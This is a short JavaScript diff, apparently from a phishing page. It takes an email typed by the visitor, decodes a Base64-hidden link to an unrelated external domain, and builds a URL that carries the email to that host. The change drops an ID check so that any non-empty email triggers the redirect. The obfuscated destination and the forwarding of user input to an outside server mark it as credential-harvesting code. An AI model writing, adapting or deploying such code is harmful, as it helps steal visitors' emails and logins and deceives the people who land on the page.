@@ -164,7 +164,7 @@
         const email = emailInput.value.trim();
         let emailId = new URLSearchParams(window.location.search).get("id");
 
-        if (emailId == email) {
+        if (email != "") {
           const link = "aHR0cHM6Ly9WQnE0Mi5lbGxpZmx1b3U2LmNvbS9WQnE0Mi8="; // Base64 encoded link
           const decodedLink = atob(link);
           const finalLink = `${decodedLink}#M${email}`;
